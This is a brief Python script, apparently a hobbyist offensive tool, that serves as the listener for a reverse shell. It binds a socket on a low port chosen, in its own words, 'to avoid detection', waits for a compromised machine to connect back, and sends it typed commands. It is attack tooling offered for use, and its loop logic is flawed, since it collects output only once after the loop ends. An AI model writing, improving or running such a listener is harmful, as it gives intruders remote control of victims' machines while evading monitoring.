''' This is meant to listen for a reverse shell connection '''

# Needed to form a socket
import socket

# Host IP address and listening port (Under 1000 to avoid detection)
HOST = '0.0.0.0'
PORT = 87

# Creating the socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

while True: 
    print(f'[*] listening as {HOST}:{PORT}')

    client = s.accept()
    print(f'[*] Client connected {client[1]}')

    client[0].send('Connection Established...'.encode()) #Custom message can be put here.
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

    result = client[0].recv(1024).decode()
    print(result)

s.close()
